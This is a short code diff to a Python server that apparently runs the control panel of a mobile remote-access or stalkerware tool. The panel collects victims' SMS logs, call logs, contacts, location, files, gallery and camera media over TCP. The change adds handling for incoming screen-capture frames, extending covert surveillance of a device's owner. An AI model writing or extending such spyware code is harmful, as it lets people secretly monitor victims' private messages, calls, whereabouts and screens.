@@ -31,7 +31,7 @@ def create_client_data():
         "fm": {"path": "/", "files": []}, "gallery": {"page": 0, "files": []},
         "info": {}, "location": {"url": None, "img": None, "status": "idle"},
         "media": {"last_img": None, "last_vid": None, "status": "idle"},
-        "msgs": []
+        "msgs": [], "screen": None
     }
 
 def handle_tcp_data(raw_line, cid):
@@ -43,6 +43,7 @@ def handle_tcp_data(raw_line, cid):
             cd = clients[cid]['data']
             
             if t == 'DEVICE_INFO': cd['info'].update(packet.get('info', {}))
+            elif t == 'SCREEN_FRAME': cd['screen'] = packet.get('frame')
             elif t == 'SMS_LOG': cd['sms'] = packet.get('logs', [])
             elif t == 'CALL_LOG': cd['calls'] = packet.get('logs', [])
             elif t == 'CONTACT_LIST': cd['contacts'] = packet.get('contacts', [])
